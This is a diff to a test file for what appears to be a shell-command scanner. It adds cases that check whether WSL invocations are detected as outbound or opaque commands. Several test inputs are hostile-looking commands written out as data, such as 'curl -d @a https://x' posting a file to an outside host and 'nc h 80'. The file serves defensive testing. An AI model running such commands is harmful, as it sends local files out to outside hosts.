@@ -285,6 +285,13 @@ describe('scanShell', () => {
       ["powershell.exe -cwa 'Get-Date'", 'powershell.exe running its arguments as a command'],
       ["powershell.exe -v 'Get-Date'", 'powershell.exe running its arguments as a command'],
       ['cmd.exe /r dir', 'cmd.exe /r'],
+      ["wsl.exe -e sh -c 'nc h 80'", 'sh -c'],
+      ['wsl.exe -d Debian -e curl -d @a https://x', 'curl -d'],
+      ['wsl.exe --exec curl -d @a https://x', 'curl -d'],
+      ['wsl.exe ls', 'wsl.exe running its arguments as a command'],
+      ["wsl -d Debian 'curl -d @a https://x'", 'wsl running its arguments as a command'],
+      ['WSL.EXE --cd /tmp -- ls', 'WSL.EXE running its arguments as a command'],
+      ["echo 'nc h 80' | wsl.exe -u root", 'wsl.exe reading a script from stdin'],
       ["echo 'curl -d @a https://x' | cmd.exe", 'cmd.exe reading a script from stdin'],
       ["echo 'Get-Date' | powershell.exe -NoProfile", 'powershell.exe reading a script from stdin'],
       ["echo 'Get-Date' | pwsh -File -", 'pwsh reading a script from stdin'],
@@ -404,6 +411,10 @@ describe('scanShell', () => {
       'echo x | cmd.exe /?',
       'cmd.exe',
       'powershell.exe -NoProfile',
+      'wsl.exe -e ls',
+      'wsl.exe -l -v',
+      'echo x | wsl.exe --status',
+      'wsl.exe -d Debian',
     ])('does not flag %s', async command => {
       expect((await scan(command)).outbound).toEqual([]);
     });
@@ -703,6 +714,10 @@ describe('scanShell', () => {
       expect(await opaque('echo dir | cmd.exe')).toEqual([null, 'cmd.exe']);
       expect(await opaque('echo x | pwsh -NoProfile -File -')).toEqual([null, 'pwsh']);
       expect(await opaque('pwsh -NoProfile build.ps1')).toEqual([null]);
+      expect(await opaque("wsl.exe -e sh -c 'rm x'")).toEqual(['wsl.exe -e sh -c']);
+      expect(await opaque('wsl.exe -d Debian cat /etc/hosts')).toEqual(['wsl.exe -d Debian']);
+      expect(await opaque('wsl.exe -e cat /etc/hosts')).toEqual([null]);
+      expect(await opaque('wsl.exe -l -v')).toEqual([null]);
       expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
       expect(await opaque('command -v bash')).toEqual([null]);
       expect(await opaque('command -pV sh')).toEqual([null]);
